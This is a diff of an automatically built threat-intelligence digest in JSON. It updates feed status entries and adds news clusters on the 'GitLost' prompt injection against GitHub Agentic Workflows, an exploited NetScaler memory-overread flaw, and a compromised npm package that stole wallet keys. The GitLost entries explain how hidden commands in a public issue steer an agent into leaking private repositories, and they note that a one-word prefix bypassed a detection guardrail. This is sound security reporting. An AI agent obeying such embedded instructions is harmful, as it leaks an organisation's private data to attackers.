@@ -1,13 +1,13 @@
 {
-  "generated_at": "2026-07-13T19:38:13.782008+00:00",
+  "generated_at": "2026-07-13T21:03:58.171828+00:00",
   "lookback_hours": 168,
   "lookback_human": "7 days",
   "total_feeds": 80,
-  "feeds_ok": 75,
-  "total_items_in_window": 299,
-  "total_clusters_raw": 133,
-  "total_clusters_in_packet": 60,
-  "dropped_low_score": 73,
+  "feeds_ok": 77,
+  "total_items_in_window": 336,
+  "total_clusters_raw": 151,
+  "total_clusters_in_packet": 63,
+  "dropped_low_score": 88,
   "dropped_overflow": 0,
   "cohort_metadata": {
     "threat_research_primary": {
@@ -67,6 +67,13 @@
     }
   },
   "feed_status": {
+    "Unit 42": {
+      "url": "https://unit42.paloaltonetworks.com/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 15,
+      "in_window_count": 2
+    },
     "CrowdStrike": {
       "url": "https://www.crowdstrike.com/blog/feed/",
       "cohort": "threat_research_primary",
@@ -74,12 +81,12 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "Unit 42": {
-      "url": "https://unit42.paloaltonetworks.com/feed/",
+    "SentinelOne Labs": {
+      "url": "https://www.sentinelone.com/labs/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 15,
-      "in_window_count": 2
+      "item_count": 10,
+      "in_window_count": 1
     },
     "Google Threat Analysis Group": {
       "url": "https://blog.google/threat-analysis-group/rss/",
@@ -95,26 +102,12 @@
       "item_count": 25,
       "in_window_count": 0
     },
-    "SentinelOne Labs": {
-      "url": "https://www.sentinelone.com/labs/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
-    },
     "Microsoft Security Blog": {
       "url": "https://www.microsoft.com/en-us/security/blog/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 4
-    },
-    "Microsoft Threat Intelligence": {
-      "url": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
     },
     "Sekoia": {
       "url": "https://blog.sekoia.io/feed/",
@@ -130,6 +123,13 @@
       "item_count": 15,
       "in_window_count": 3
     },
+    "NCSC UK": {
+      "url": "https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml",
+      "cohort": "government_authoritative",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 3
+    },
     "Citizen Lab": {
       "url": "https://citizenlab.ca/feed/",
       "cohort": "threat_research_primary",
@@ -137,12 +137,12 @@
       "item_count": 10,
       "in_window_count": 1
     },
-    "NCSC UK": {
-      "url": "https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml",
-      "cohort": "government_authoritative",
+    "Microsoft Threat Intelligence": {
+      "url": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/",
+      "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 20,
-      "in_window_count": 3
+      "item_count": 10,
+      "in_window_count": 1
     },
     "SANS Internet Storm Center": {
       "url": "https://isc.sans.edu/rssfeed_full.xml",
@@ -151,13 +151,6 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "Kaspersky Securelist": {
-      "url": "https://securelist.com/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
-    },
     "Check Point Research": {
       "url": "https://research.checkpoint.com/feed/",
       "cohort": "threat_research_primary",
@@ -165,12 +158,12 @@
       "item_count": 15,
       "in_window_count": 1
     },
-    "Horizon3 Attack Research": {
-      "url": "https://horizon3.ai/feed/",
-      "cohort": "offensive_vulnerability_research",
+    "Kaspersky Securelist": {
+      "url": "https://securelist.com/feed/",
+      "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 5
+      "in_window_count": 1
     },
     "ESET WeLiveSecurity": {
       "url": "https://www.welivesecurity.com/en/rss/feed/",
@@ -179,12 +172,26 @@
       "item_count": 100,
       "in_window_count": 1
     },
+    "Horizon3 Attack Research": {
+      "url": "https://horizon3.ai/feed/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 6
+    },
     "GitHub Security Lab": {
       "url": "https://github.blog/category/security/feed/",
       "cohort": "offensive_vulnerability_research",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 1
+    },
+    "Red Canary": {
+      "url": "https://redcanary.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 0
     },
     "Volexity": {
       "url": "https://www.volexity.com/feed/",
@@ -200,19 +207,12 @@
       "item_count": 40,
       "in_window_count": 0
     },
-    "Red Canary": {
-      "url": "https://redcanary.com/feed/",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
-    },
-    "Exploit-DB": {
-      "url": "https://www.exploit-db.com/rss.xml",
-      "cohort": "offensive_vulnerability_research",
+    "Recorded Future": {
+      "url": "https://www.recordedfuture.com/feed",
+      "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 50,
-      "in_window_count": 12
+      "in_window_count": 3
     },
     "Assetnote": {
       "url": "https://www.assetnote.io/resources/research/rss.xml",
@@ -221,12 +221,12 @@
       "item_count": 78,
       "in_window_count": 0
     },
-    "Recorded Future": {
-      "url": "https://www.recordedfuture.com/feed",
-      "cohort": "threat_research_primary",
+    "Exploit-DB": {
+      "url": "https://www.exploit-db.com/rss.xml",
+      "cohort": "offensive_vulnerability_research",
       "status": "ok",
       "item_count": 50,
-      "in_window_count": 3
+      "in_window_count": 12
     },
     "watchTowr Labs": {
       "url": "https://labs.watchtowr.com/rss/",
@@ -242,19 +242,19 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "TrustedSec": {
-      "url": "https://www.trustedsec.com/feed/",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 2
-    },
     "Proofpoint Threat Insight": {
       "url": "https://www.proofpoint.com/us/rss.xml",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 0
+    },
+    "TrustedSec": {
+      "url": "https://www.trustedsec.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 2
     },
     "Active Countermeasures": {
       "url": "https://www.activecountermeasures.com/feed/",
@@ -284,13 +284,6 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "Rapid7": {
-      "url": "https://www.rapid7.com/blog/rss/",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 2
-    },
     "Datadog Security Labs": {
       "url": "https://securitylabs.datadoghq.com/rss/feed.xml",
       "cohort": "cloud_identity_infrastructure",
@@ -305,8 +298,8 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "Trail of Bits": {
-      "url": "https://blog.trailofbits.com/feed/",
+    "Rapid7": {
+      "url": "https://www.rapid7.com/blog/rss/",
       "cohort": "offensive_vulnerability_research",
       "status": "ok",
       "item_count": 20,
@@ -318,6 +311,13 @@
       "status": "ok",
       "item_count": 20,
       "in_window_count": 6
+    },
+    "Trail of Bits": {
+      "url": "https://blog.trailofbits.com/feed/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 2
     },
     "Permiso Security": {
       "url": "https://permiso.io/blog/rss.xml",
@@ -340,6 +340,13 @@
       "item_count": 10,
       "in_window_count": 0
     },
+    "Sysdig": {
+      "url": "https://sysdig.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 1
+    },
     "Google Cloud Threat Intelligence": {
       "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
       "cohort": "threat_research_primary",
@@ -354,18 +361,25 @@
       "item_count": 20,
       "in_window_count": 3
     },
-    "Sysdig": {
-      "url": "https://sysdig.com/feed/",
-      "cohort": "detection_response_operations",
+    "Wiz Research": {
+      "url": "https://www.wiz.io/feed/rss.xml",
+      "cohort": "cloud_identity_infrastructure",
       "status": "ok",
       "item_count": 100,
-      "in_window_count": 1
+      "in_window_count": 5
     },
     "Google DeepMind Blog": {
       "url": "https://deepmind.google/blog/rss.xml",
       "cohort": "ai_security_agentic_risk",
       "status": "ok",
       "item_count": 100,
+      "in_window_count": 0
+    },
+    "Coveware": {
+      "url": "https://www.coveware.com/blog?format=rss",
+      "cohort": "ransomware_ecrime_financial_crime",
+      "status": "parse_error",
+      "item_count": 0,
       "in_window_count": 0
     },
     "Cloudflare Radar": {
@@ -375,33 +389,12 @@
       "item_count": 20,
       "in_window_count": 0
     },
-    "Wiz Research": {
-      "url": "https://www.wiz.io/feed/rss.xml",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 5
-    },
-    "Coveware": {
-      "url": "https://www.coveware.com/blog?format=rss",
-      "cohort": "ransomware_ecrime_financial_crime",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
-    },
     "Google Cloud Security": {
       "url": "https://cloudblog.withgoogle.com/rss/",
       "cohort": "cloud_identity_infrastructure",
       "status": "ok",
       "item_count": 20,
       "in_window_count": 20
-    },
-    "OpenSSF Blog": {
-      "url": "https://openssf.org/feed/",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
     },
     "Chainalysis": {
       "url": "https://www.chainalysis.com/blog/feed/",
@@ -410,19 +403,19 @@
       "item_count": 10,
       "in_window_count": 2
     },
+    "OpenSSF Blog": {
+      "url": "https://openssf.org/feed/",
+      "cohort": "ai_security_agentic_risk",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 0
+    },
     "Interconnects": {
       "url": "https://www.interconnects.ai/feed",
       "cohort": "ai_security_agentic_risk",
       "status": "ok",
       "item_count": 20,
       "in_window_count": 1
-    },
-    "Dark Reading": {
-      "url": "https://www.darkreading.com/rss.xml",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
     },
     "The Record": {
       "url": "https://therecord.media/feed",
@@ -438,26 +431,19 @@
       "item_count": 15,
       "in_window_count": 15
     },
-    "GreyNoise": {
-      "url": "https://www.greynoise.io/blog/rss.xml",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 0
-    },
-    "Help Net Security": {
-      "url": "https://www.helpnetsecurity.com/feed/",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
-    },
     "SecurityWeek": {
       "url": "https://www.securityweek.com/feed/",
       "cohort": "cyber_news_breach_reporting",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 10
+    },
+    "GreyNoise": {
+      "url": "https://www.greynoise.io/blog/rss.xml",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 1
     },
     "CyberScoop": {
       "url": "https://cyberscoop.com/feed/",
@@ -480,12 +466,19 @@
       "item_count": 20,
       "in_window_count": 2
     },
-    "Krebs on Security": {
-      "url": "https://krebsonsecurity.com/feed/",
-      "cohort": "practitioner_analysis",
+    "Dark Reading": {
+      "url": "https://www.darkreading.com/rss.xml",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 24
+    },
+    "Help Net Security": {
+      "url": "https://www.helpnetsecurity.com/feed/",
+      "cohort": "cyber_news_breach_reporting",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 2
+      "in_window_count": 10
     },
     "Troy Hunt": {
       "url": "https://www.troyhunt.com/rss/",
@@ -494,19 +487,19 @@
       "item_count": 15,
       "in_window_count": 1
     },
+    "Krebs on Security": {
+      "url": "https://krebsonsecurity.com/feed/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 2
+    },
     "Schneier on Security": {
       "url": "https://www.schneier.com/feed/atom/",
       "cohort": "practitioner_analysis",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 6
-    },
-    "Black Hills Information Security": {
-      "url": "https://www.blackhillsinfosec.com/feed/",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 1
     },
     "Team Cymru": {
       "url": "https://www.team-cymru.com/post/rss.xml",
@@ -529,6 +522,13 @@
       "item_count": 0,
       "in_window_count": 0
     },
+    "Black Hills Information Security": {
+      "url": "https://www.blackhillsinfosec.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 1
+    },
     "Reddit r/sysadmin": {
       "url": "https://www.reddit.com/r/sysadmin/.rss",
       "cohort": "reddit_practitioner_osint",
@@ -543,12 +543,12 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "Graham Cluley": {
-      "url": "https://grahamcluley.com/feed/",
-      "cohort": "practitioner_analysis",
+    "The Hacker News": {
+      "url": "https://feeds.feedburner.com/TheHackersNews",
+      "cohort": "cyber_news_breach_reporting",
       "status": "ok",
-      "item_count": 20,
-      "in_window_count": 3
+      "item_count": 50,
+      "in_window_count": 50
     },
     "Reddit r/netsecstudents": {
       "url": "https://www.reddit.com/r/netsecstudents/.rss",
@@ -564,19 +564,12 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "The Hacker News": {
-      "url": "https://feeds.feedburner.com/TheHackersNews",
-      "cohort": "cyber_news_breach_reporting",
+    "Graham Cluley": {
+      "url": "https://grahamcluley.com/feed/",
+      "cohort": "practitioner_analysis",
       "status": "ok",
-      "item_count": 50,
-      "in_window_count": 50
-    },
-    "Intel 471": {
-      "url": "https://intel471.com/blog/feed",
-      "cohort": "ransomware_ecrime_financial_crime",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 0
+      "item_count": 20,
+      "in_window_count": 3
     },
     "Infosecurity Magazine": {
       "url": "https://www.infosecurity-magazine.com/rss/news/",
@@ -585,19 +578,19 @@
       "item_count": 100,
       "in_window_count": 29
     },
+    "Intel 471": {
+      "url": "https://intel471.com/blog/feed",
+      "cohort": "ransomware_ecrime_financial_crime",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 0
+    },
     "Reddit r/netsec": {
       "url": "https://www.reddit.com/r/netsec/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 25,
-      "in_window_count": 10
-    },
-    "tl;dr sec": {
-      "url": "https://tldrsec.com/feed.xml",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
+      "in_window_count": 11
     },
     "Embrace the Red": {
       "url": "https://embracethered.com/blog/index.xml",
@@ -605,6 +598,13 @@
       "status": "ok",
       "item_count": 100,
       "in_window_count": 0
+    },
+    "tl;dr sec": {
+      "url": "https://tldrsec.com/feed.xml",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 1
     },
     "Risky Business News": {
       "url": "https://risky.biz/feeds/risky-business-news/",
@@ -2489,6 +2489,180 @@
       ]
     },
     {
+      "cluster_id": "26eda5e0a9",
+      "priority_score": 12,
+      "member_count": 4,
+      "corroborating_source_count": 3,
+      "strong_signals": [
+        "GitHub"
+      ],
+      "taxonomy": {
+        "threat_categories": [
+          "ai_security"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "critical_infrastructure",
+          "financial_services"
+        ],
+        "affected_products": [
+          "GitHub",
+          "npm"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "poc_available",
+          "preauth_unauth"
+        ],
+        "content_type": [
+          "incident_report",
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news",
+          "tier_5_chatter"
+        ]
+      },
+      "primary": {
+        "source": "Dark Reading",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "'GitLost' Flaw Leaks Private Data From GitHub's Agentic Workflows",
+        "link": "https://www.darkreading.com/cyber-risk/gitlost-leaks-private-data-github-agentic-workflows",
+        "published": "2026-07-07T15:24:30+00:00",
+        "summary": "The flaw allows an unauthenticated attacker to craft a GitHub Issue in an org's public repository and then silently pull data from its private repos, too.",
+        "full_body": "Cyber Risk Data Privacy Threat Intelligence Vulnerabilities & Threats News 'GitLost' Flaw Leaks Private Data From GitHub's Agentic Workflows The flaw allows an unauthenticated attacker to craft a GitHub Issue in an org's public repository and then silently pull data from its private repos, too. Elizabeth Montalbano , Contributing Writer July 7, 2026 4 Min Read Source: Pattara via Alamy Stock Photo A critical prompt injection flaw in GitHub Agentic Workflows allows attackers to trick AI-powered automation into leaking data from an organization's private code repositories, all without compromising an account or exploiting software vulnerabilities. Using the flaw, dubbed \"GitLost\" by the researchers from Noma Security who discovered it, an unauthenticated attacker can craft a GitHub Issue in a public repository belonging to an organization, and then silently pull data from its private repositories, too, according to a report published yesterday. GitHub Agentic Workflows pairs GitHub Actions — the platform's automation system for running tasks in response to repository events — with an AI agent backed by Claude or GitHub Copilot to help developer teams manage their GitHub workflows. The tool lets teams automate their interactions with code repositories using natural language, and the GitHub agent can read issues, call tools, and access other repositories within an organization. Related: More Countries Jump on the Social Media 'Ban Wagon' \"GitLost perfectly illustrates one of the fundamental security challenges every organization faces with agentic AI systems,\" Sasi Levi, security research lead at Noma, wrote in the report. \"The agent's context window is also its attack surface. Any content the agent reads, whether issues, pull requests, comments, or files, can be weaponized if the agent treats that content as instructional input.\" This scenario paved the way for what has now become a common attack vector in agentic AI systems: prompt injection , which is the nature of the flaw that Noma discovered and exploited via a proof-of-concept (PoC) exploit. Exploiting the GitLost Flaw The vulnerable GitHub Agentic Workflow was configured to do the following: trigger the workflow on \"issues.assigned\" events in GitHub; read the issue Title and Body; post a comment in response using the add-comment tool; and run with read access to other repositories (public and private) in the organization. The PoC developed by Noma that exploits this workflow resulted in the exposure of an organization's private data regarding a meeting that employees had. The PoC demonstrates how a threat actor can create a GitHub Issue and, in the issue body, hide commands in plain English that GitHub's agent will follow, according to the report. An attacker needs no coding skills, access, or credentials to exploit the flaw — they only have to open an issue in a public repository belonging to an organization that uses GitHub’s Agentic Workflow setup, and then wait. Related: Iran's Cyber Crosshairs Focus Beyond Critical Infrastructure \"In most agentic prompt injection attacks, the agent treats the wrong content as a trusted source of instructions and allows itself to be misdirected or misused,\" Levi wrote. \"This happens when the system fails to maintain a strict trust boundary between system-level directives and untrusted user data.\" Indeed, the vulnerability demonstrates that threat actors only \"need to hide plain-English commands within content to trick a highly permissioned AI into bypassing its own guardrails and silently handing over private intellectual property,\" Jason Soroko, senior fellow at certificate life cycle management provider Sectigo, tells Dark Reading. Noma said it responsibly disclosed the flaw to GitHub, which did not immediately respond to Dark Reading's request for comment on whether the flaw has been addressed. GitHub told Noma it updated the documentation creating the flaw, and the last time the researchers checked, it was not there, according to N",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ai_security"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "critical_infrastructure"
+          ],
+          "affected_products": [
+            "GitHub"
+          ],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "preauth_unauth",
+            "poc_available"
+          ],
+          "content_type": "incident_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {
+            "GitHub": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Dark Reading",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "'GitLost' Flaw Leaks Private Data From GitHub's Agentic Workflows",
+          "link": "https://www.darkreading.com/cyber-risk/gitlost-leaks-private-data-github-agentic-workflows",
+          "published": "2026-07-07T15:24:30+00:00",
+          "summary": "The flaw allows an unauthenticated attacker to craft a GitHub Issue in an org's public repository and then silently pull data from its private repos, too.",
+          "taxonomy": {
+            "threat_categories": [
+              "ai_security"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "critical_infrastructure"
+            ],
+            "affected_products": [
+              "GitHub"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "preauth_unauth",
+              "poc_available"
+            ],
+            "content_type": "incident_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "GitHub": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "Reddit r/netsec",
+          "cohort": "reddit_practitioner_osint",
+          "title": "GitLost: a public GitHub issue can steer an org's Agentic Workflow into leaking private repo contents, and a one-word prefix (\"Additionally\") bypassed the threat-detection guardrail",
+          "link": "https://www.reddit.com/r/netsec/comments/1upy3gm/gitlost_a_public_github_issue_can_steer_an_orgs/",
+          "published": "2026-07-07T15:16:22+00:00",
+          "summary": "Noma Security published a technique they call GitLost against GitHub Agentic Workflows (the plain-English-Markdown agent feature GitHub put into public preview in February, runnable on Copilot, Claude, Gemini, or Codex). Worth reading because it is a clean demonstration of why \"filter the injection\" does not hold as a defense. The setup. Workflows are read-only by default, but an org can hand one a personal access token with read access across its repos, private ones included, to give the agent cross-repo context. That grant is the whole vulnerability. Nothing else about the attack requires access: no stolen creds, no write access to anything private, no touching a server. The attacker just opens a normal-looking issue on a public repo. The technique is indirect prompt injection, which is not new, but the interesting part is what the agent controls. Noma's Sasi Levi frames the distinction as earlier injection being about manipulating what an agent says, versus GitLost being about what ",
+          "taxonomy": {
+            "threat_categories": [
+              "ai_security"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "GitHub"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "incident_report",
+            "confidence_tier": "tier_5_chatter",
+            "role_map": {
+              "GitHub": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "The Hacker News",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Injective Labs GitHub Compromise Pushes Wallet-Key-Stealing npm Packages",
+          "link": "https://thehackernews.com/2026/07/injective-labs-github-compromise-pushes.html",
+          "published": "2026-07-10T16:29:00+00:00",
+          "summary": "Unknown threat actors compromised the Injective Labs SDK project's GitHub repository and leveraged it to publish a malicious package on the npm registry to steal cryptocurrency wallet private keys and mnemonic seed phrases. The compromised version, @injectivelabs/sdk-ts@1.20.21, came embedded with fake telemetry functionality that exfiltrated data from cryptocurrency wallets. The version was",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [
+              "financial_services"
+            ],
+            "affected_products": [
+              "GitHub",
+              "npm"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "GitHub": "target",
+              "npm": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "685ef943c5",
       "priority_score": 11,
       "member_count": 1,
@@ -2571,6 +2745,118 @@
             "content_type": "news_report",
             "confidence_tier": "tier_1_government",
             "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "dfea83e3cb",
+      "priority_score": 11,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "zero_day"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "financial_services"
+        ],
+        "affected_products": [
+          "Citrix"
+        ],
+        "tools_used": [],
+        "cve_ids": [
+          "CVE-2026-8451"
+        ],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "poc_available",
+          "zero_day"
+        ],
+        "content_type": [
+          "vulnerability_disclosure"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "Dark Reading",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "CitrixBleed-ing Again? NetScaler Vulnerability Under Attack",
+        "link": "https://www.darkreading.com/vulnerabilities-threats/citrixbleed-ing-again-netscaler-vulnerability-under-attack",
+        "published": "2026-07-06T21:17:42+00:00",
+        "summary": "Attackers wasted little time targeting the latest memory disclosure flaw in Citrix's NetScaler products, after researchers published a proof-of-concept exploit (PoC).",
+        "full_body": "Vulnerabilities & Threats Cyber Risk Application Security Cyberattacks & Data Breaches News CitrixBleed-ing Again? NetScaler Vulnerability Under Attack Attackers wasted little time targeting the latest memory disclosure flaw in Citrix's NetScaler products, after researchers published a proof-of-concept exploit (PoC). Rob Wright , Senior News Director , Dark Reading July 6, 2026 3 Min Read Source: Justin Sullivan via Getty Images Another NetScaler security vulnerability in the vein of the infamous \"CitrixBleed\" flaw has come under attack, which could leak risky corporate information. Citrix on June 30 took the wraps off CVE-2026-8451, the memory overread vulnerability in the company's Netscaler product line that received a CVSS score of 8.8. The high-severity flaw affects Citrix NetScaler Application Delivery Controller (ADC) and NetScaler Gateway devices that are configured as a SAML identity provider (IDP). CVE-2026-8451 is caused by insufficient input validation, which allows a remote threat actor to send requests to the IDP appliance and trigger a memory overread that leaks sensitive data. Experts have noted the flaw is reminiscent of CitrixBleed (CVE 2023-4966), a critical zero-day vulnerability that came under widespread exploitation following its disclosure in late 2023. And like CitrixBleed and its successors , CVE-2026-8451 has also attracted the attention of threat actors. At least one vendor has reported attacks against the latest NetScaler vulnerability, following the publication of a proof-of-concept (PoC) exploit. Related: Fresh ATM Crypto Software Bugs: Jackpot or Bust? Another NetScaler Flaw Under Attack? Researchers at WatchTowr discovered CVE-2026-8451 in March and reported their findings to Citrix. WatchTowr Labs published full technical details of the flaw, which XML parser, and a PoC exploit on the same day Citrix disclosed and patched the flaw. The following day, cybersecurity vendor Lupovis reported a coordinated scanning campaign targeting NetScaler devices that began less than 24 hours later. Based on activity from the company's decoy infrastructure, a single threat actor tied to a malicious IP address deployed an exploitation payload for CVE-2026-8451, Lupovis confirmed. In a post on social media platform X on July 3, the vendor said it has \"seen a lot more exploitation.\" According to Lupovis's blog post , the scanning activity originated from 146.70.139[.]154, which is hosted on M247, a global VPN and hosting provider \"commonly observed in opportunistic scanning campaigns.\" In the blog post, Xavier Bellekens, co-founder and CEO of Lupovis, stressed that what the vendor observed was not generic scanning activity but a specific exploit payload for CVE-2026-8451. He also tied the threat activity to WatchTowr's PoC. \"This is the watchTowr overread variant designed to flood NetScaler’s XML parser with whitespace, forcing it to read past the buffer boundary into adjacent memory,\" Bellekens wrote. \"The structure matches the CVE-2026-8451 Detection Artifact Generator published by watchTowr on 30 June 2026.\" Related: Microsoft Reins in RoguePlanet Zero-Day Threat Dark Reading contacted Citrix regarding the exploitation report, but the company did not respond by press time. Corporate Risks Posed by CVE-2026-8451 In a threat advisory last week, cloud security vendor Aviatrix noted that a threat actor could exploit the memory-disclosure flaw to gain initial access to a NetScaler SAML IDP appliance and use the leaked memory contents to escalate privileges, move laterally in a victim's network and exfiltrate additional sensitive data. Aviatrix researchers also noted CVE-2026-8451's similarities to the CitrixBleed attacks, and urged organizations to take action. \"The disclosure underscores ongoing challenges in securing critical network infrastructure,\" the vendor said in the advisory. \"Organizations relying on NetScaler appliances should promptly apply the provided patches and review their configurations to mitigat",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "zero_day"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "financial_services"
+          ],
+          "affected_products": [
+            "Citrix"
+          ],
+          "tools_used": [],
+          "cve_ids": [
+            "CVE-2026-8451"
+          ],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "zero_day",
+            "poc_available"
+          ],
+          "content_type": "vulnerability_disclosure",
+          "confidence_tier": "tier_4_news",
+          "role_map": {
+            "Citrix": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Dark Reading",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "CitrixBleed-ing Again? NetScaler Vulnerability Under Attack",
+          "link": "https://www.darkreading.com/vulnerabilities-threats/citrixbleed-ing-again-netscaler-vulnerability-under-attack",
+          "published": "2026-07-06T21:17:42+00:00",
+          "summary": "Attackers wasted little time targeting the latest memory disclosure flaw in Citrix's NetScaler products, after researchers published a proof-of-concept exploit (PoC).",
+          "taxonomy": {
+            "threat_categories": [
+              "zero_day"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "financial_services"
+            ],
+            "affected_products": [
+              "Citrix"
+            ],
+            "tools_used": [],
+            "cve_ids": [
+              "CVE-2026-8451"
+            ],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "zero_day",
+              "poc_available"
+            ],
+            "content_type": "vulnerability_disclosure",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "Citrix": "target"
+            },
             "weak_tags": {
               "products": []
             }
@@ -3398,97 +3684,6 @@
       ]
     },
     {
-      "cluster_id": "0514a6908e",
-      "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_1_offensive_research"
-        ]
-      },
-      "primary": {
-        "source": "Exploit-DB",
-        "cohort": "offensive_vulnerability_research",
-        "title": "[remote] iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter",
-        "link": "https://www.exploit-db.com/exploits/52618",
